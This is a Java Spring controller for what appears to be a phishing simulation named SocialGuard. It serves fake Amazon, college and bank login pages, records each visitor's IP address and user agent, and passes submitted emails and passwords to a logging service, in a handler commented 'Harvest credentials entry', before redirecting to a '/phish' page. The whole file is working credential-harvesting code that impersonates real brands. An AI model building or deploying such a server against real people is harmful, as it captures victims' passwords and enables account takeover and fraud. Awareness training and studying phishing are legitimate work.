package com.socialguard.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

import com.socialguard.service.VisitorService;

import jakarta.servlet.http.HttpServletRequest;

@Controller
public class PhishingController {

    private static final Logger log = LoggerFactory.getLogger(PhishingController.class);

    private final VisitorService visitors;

    public PhishingController(VisitorService visitors) {
        this.visitors = visitors;
    }

    // Health check route
    @GetMapping(value = "/", produces = "text/plain;charset=UTF-8")
    @org.springframework.web.bind.annotation.ResponseBody
    public String landing() {
        return "Server is running";
    }

    @GetMapping("/amazon_login")
    public String amazonLoginPage(HttpServletRequest req) {
        logVisitor(req);
        return "forward:/amazon_login.html";
    }

    // Harvest credentials entry
    @PostMapping("/amazon_login")
    public String handleAmazonLogin(
            @RequestParam(value = "email", required = false) String email,
            @RequestParam(value = "password", required = false) String password) {
        visitors.logLogin(email, password);
        return "redirect:/phish";
    }

    @GetMapping("/college_login")
    public String collegeLoginPage(HttpServletRequest req) {
        logVisitor(req);
        return "forward:/college_login.html";
    }

    @PostMapping("/college_login")
    public String handleCollegeLogin(
            @RequestParam(value = "email", required = false) String email,
            @RequestParam(value = "password", required = false) String password) {
        visitors.logLogin(email, password);
        return "redirect:/phish";
    }

    @GetMapping("/bank_login")
    public String bankLoginPage(HttpServletRequest req) {
        logVisitor(req);
        return "forward:/bank_login.html";
    }

    @PostMapping("/bank_login")
    public String handleBankLogin(
            @RequestParam(value = "email", required = false) String email,
            @RequestParam(value = "password", required = false) String password) {
        visitors.logLogin(email, password);
        return "redirect:/phish";
    }

    @GetMapping("/phish")
    public String phishingInfo() {
        return "forward:/phish.html";
    }

    // Extract client IP
    private void logVisitor(HttpServletRequest req) {
        try {
            String forwarded = req.getHeader("X-Forwarded-For");
            String raw = forwarded != null && !forwarded.isEmpty() ? forwarded : req.getRemoteAddr();
            String ip = raw.split(",")[0].trim();
            String userAgent = req.getHeader("User-Agent");
            visitors.logVisitor(ip, userAgent);
        } catch (Exception e) {
            log.error("Error during visitor logging: {}", e.getMessage());
        }
    }
}
